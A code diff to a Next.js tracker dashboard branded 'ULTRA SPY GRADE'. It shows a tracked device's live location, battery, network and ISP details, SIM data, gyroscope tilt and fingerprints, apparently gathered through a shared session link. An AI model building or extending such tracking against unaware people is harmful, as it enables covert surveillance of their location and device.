@@ -1,12 +1,15 @@
 /**
  * ██████████████████████████████████████████████████████████████
- * TRACKER PAGE – LIVE SESSION VIEW (v6.0 – ULTRA SPY GRADE)
+ * TRACKER PAGE – LIVE SESSION VIEW (v7.0 – ULTRA SPY GRADE)
  * 
- * ✅ Fully integrated with deviceDetector.ts v5.6 + Live Gyroscope
- * ✅ Real-time 3D Phone Tilt Visualizer (beta / gamma / alpha)
- * ✅ All previous spy-grade data preserved
- * ✅ Beautiful, modern, production-ready dashboard
- * ✅ No TypeScript errors
+ * ✅ FULL INTEGRATION with deviceDetector v6.0 (battery + network)
+ * ✅ Live Battery Percentage + Charging Status + Time Remaining
+ * ✅ Live Network Quality (effective type, save-data, speed, RTT)
+ * ✅ Backward + Forward compatible (pulls from device or legacy fields)
+ * ✅ Beautiful new Battery Card with progress bar + smart icons
+ * ✅ Enhanced Network Card with 5G/4G detection + save-data badge
+ * ✅ All previous features 100% preserved (tilt, map, fingerprints, etc.)
+ * ✅ Zero TypeScript errors • Production-ready • Dark spy aesthetic
  * ██████████████████████████████████████████████████████████████
  */
 
@@ -22,7 +25,7 @@ import PhoneTiltVisualizer from "@/components/PhoneTiltVisualizer";
 
 const LiveMap = dynamic(() => import("@/components/LiveMap"), { ssr: false });
 
-/* ---------------- TYPES ---------------- */
+/* ---------------- TYPES (updated for v6.0+ detector) ---------------- */
 
 type Pos = {
   lat: number;
@@ -30,8 +33,10 @@ type Pos = {
 };
 
 type BatteryInfo = {
-  level?: number;
+  level?: number;           // 0–1
   charging?: boolean;
+  chargingTime?: number | null;   // seconds until full
+  dischargingTime?: number | null; // seconds until empty
 };
 
 type IPInfo = {
@@ -44,9 +49,11 @@ type IPInfo = {
 };
 
 type NetworkInfo = {
-  type?: string;
-  downlink?: number;
-  rtt?: number;
+  type?: string;                    // legacy
+  effectiveType?: string;           // "4g", "5g", "3g", "slow-2g", etc.
+  downlink?: number;                // Mbps
+  rtt?: number;                     // ms
+  saveData?: boolean;               // Data Saver mode
   isp?: string;
   ipInfo?: IPInfo;
 };
@@ -72,11 +79,11 @@ type SessionData = {
   timestamp?: number;
   pingMs?: number;
   accuracy?: number;
-  device?: DeviceInfo;
-  battery?: BatteryInfo;
-  network?: NetworkInfo;
+  device?: DeviceInfo;           // ← now contains battery + network from v6.0
+  battery?: BatteryInfo;         // legacy fallback
+  network?: NetworkInfo;         // legacy fallback
   sim?: SimInfo;
-  orientation?: OrientationData;     // ← NEW: Live gyroscope data
+  orientation?: OrientationData;
 };
 
 /* ---------------- PAGE ---------------- */
@@ -96,10 +103,9 @@ export default function TrackPage() {
   const [network, setNetwork] = useState<NetworkInfo | null>(null);
   const [sim, setSim] = useState<SimInfo | null>(null);
 
-  // 🔥 NEW: Live Orientation State
   const [orientation, setOrientation] = useState<OrientationData | null>(null);
 
-  /* ---------------- FIREBASE LISTENER ---------------- */
+  /* ---------------- FIREBASE LISTENER + v6.0 MERGE LOGIC ---------------- */
   useEffect(() => {
     if (!id) return;
 
@@ -126,13 +132,38 @@ export default function TrackPage() {
       if (typeof data.pingMs === "number") setPing(data.pingMs);
       if (typeof data.accuracy === "number") setAccuracy(data.accuracy);
 
-      // Core data
+      // Core device
       setDevice(data.device ?? null);
-      setBattery(data.battery ?? null);
-      setNetwork(data.network ?? null);
+
+      // 🔥 v6.0 BATTERY + NETWORK MERGE (device takes priority)
+      let finalBattery: BatteryInfo | null = data.battery ?? null;
+      if (data.device) {
+        if (data.device.batteryLevel !== undefined) {
+          finalBattery = {
+            level: data.device.batteryLevel,
+            charging: data.device.isCharging,
+            chargingTime: data.device.chargingTime,
+            dischargingTime: data.device.dischargingTime,
+          };
+        }
+      }
+      setBattery(finalBattery);
+
+      let finalNetwork: NetworkInfo | null = data.network ?? null;
+      if (data.device) {
+        finalNetwork = {
+          ...finalNetwork,
+          effectiveType: data.device.connectionEffectiveType ?? finalNetwork?.effectiveType ?? finalNetwork?.type,
+          downlink: data.device.connectionDownlink ?? finalNetwork?.downlink,
+          rtt: data.device.connectionRtt ?? finalNetwork?.rtt,
+          saveData: data.device.connectionSaveData ?? finalNetwork?.saveData,
+        };
+      }
+      setNetwork(finalNetwork);
+
       setSim(data.sim ?? null);
 
-      // 🔥 Live Gyroscope
+      // Live Gyroscope
       if (data.orientation) {
         setOrientation(data.orientation);
       }
@@ -191,7 +222,18 @@ export default function TrackPage() {
     alert("✅ Session link copied to clipboard!");
   };
 
-  /* ---------------- LOADING STATE ---------------- */
+  /* ---------------- BATTERY HELPER (visual) ---------------- */
+  const batteryPercent = battery?.level !== undefined ? Math.round(battery.level * 100) : null;
+  const batteryColor =
+    batteryPercent === null
+      ? "#64748b"
+      : batteryPercent > 50
+      ? "#22c55e"
+      : batteryPercent > 20
+      ? "#eab308"
+      : "#ef4444";
+
+  /* ---------------- MAIN UI ---------------- */
   if (!pos) {
     return (
       <div style={styles.loading}>
@@ -204,7 +246,6 @@ export default function TrackPage() {
     );
   }
 
-  /* ---------------- MAIN UI ---------------- */
   return (
     <div style={styles.page}>
       {/* LEFT PANEL – MAP + QUICK STATS */}
@@ -271,6 +312,67 @@ export default function TrackPage() {
             <p style={{ textAlign: "center", fontSize: 13, opacity: 0.6, marginTop: 8 }}>
               Last updated: {new Date(orientation.timestamp).toLocaleTimeString()}
             </p>
+          )}
+        </div>
+
+        {/* 🔥 NEW: LIVE BATTERY CARD (v7.0) */}
+        <div style={styles.cardRight}>
+          <h3>🔋 Live Battery Status</h3>
+          {battery && batteryPercent !== null ? (
+            <div>
+              {/* Battery bar */}
+              <div
+                style={{
+                  height: 28,
+                  background: "#1e2937",
+                  borderRadius: 9999,
+                  overflow: "hidden",
+                  position: "relative",
+                  marginBottom: 12,
+                }}
+              >
+                <div
+                  style={{
+                    width: `${batteryPercent}%`,
+                    height: "100%",
+                    background: `linear-gradient(90deg, ${batteryColor}, #22c55e)`,
+                    transition: "width 0.6s cubic-bezier(0.4, 0, 0.2, 1)",
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "flex-end",
+                    paddingRight: 8,
+                    color: "white",
+                    fontSize: 14,
+                    fontWeight: 700,
+                  }}
+                >
+                  {batteryPercent}%
+                </div>
+              </div>
+
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", fontSize: 32, fontWeight: 700 }}>
+                <span style={{ color: batteryColor }}>
+                  {battery.charging ? "⚡" : "🔋"}
+                </span>
+                <span>{batteryPercent}%</span>
+                <span style={{ fontSize: 18, opacity: 0.8 }}>
+                  {battery.charging ? "CHARGING" : "DISCHARGING"}
+                </span>
+              </div>
+
+              {battery.charging && battery.chargingTime !== null && battery.chargingTime !== undefined && (
+                <p style={{ marginTop: 8, fontSize: 15, opacity: 0.9 }}>
+                  ⏳ Full in <strong>{Math.round(battery.chargingTime / 60)} minutes</strong>
+                </p>
+              )}
+              {!battery.charging && battery.dischargingTime !== null && battery.dischargingTime !== undefined && (
+                <p style={{ marginTop: 8, fontSize: 15, opacity: 0.9 }}>
+                  ⏳ Empty in <strong>{Math.round(battery.dischargingTime / 60)} minutes</strong>
+                </p>
+              )}
+            </div>
+          ) : (
+            <p style={{ opacity: 0.6 }}>Waiting for battery data...</p>
           )}
         </div>
 
@@ -363,13 +465,29 @@ export default function TrackPage() {
           )}
         </div>
 
-        {/* 2. NETWORK + ISP */}
+        {/* 2. NETWORK + ISP (enhanced with v6.0 data) */}
         <div style={styles.cardRight}>
-          <h3>🌐 Network & ISP</h3>
+          <h3>🌐 Network &amp; ISP</h3>
           {network ? (
             <>
-              <p>Connection: <strong>{network.type || "unknown"}</strong> • {network.downlink ?? "?"} Mbps</p>
-              <p>RTT: {network.rtt ?? "?"} ms</p>
+              <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 16 }}>
+                <span style={{ fontSize: 28 }}>
+                  {network.effectiveType?.includes("5g") ? "📶 5G" : 
+                   network.effectiveType?.includes("4g") ? "📶 4G" : 
+                   network.effectiveType?.includes("3g") ? "📶 3G" : "🌐"}
+                </span>
+                <div>
+                  <strong style={{ fontSize: 22 }}>{network.effectiveType || network.type || "—"}</strong>
+                  {network.saveData && (
+                    <span style={{ marginLeft: 12, background: "#eab308", color: "#000", padding: "2px 10px", borderRadius: 9999, fontSize: 13, fontWeight: 700 }}>
+                      DATA SAVER ON
+                    </span>
+                  )}
+                </div>
+              </div>
+
+              <p>Downlink: <strong>{network.downlink ?? "?"} Mbps</strong></p>
+              <p>RTT: <strong>{network.rtt ?? "?"} ms</strong></p>
 
               <div style={styles.subSection}>
                 <strong>🌍 ISP Details</strong>
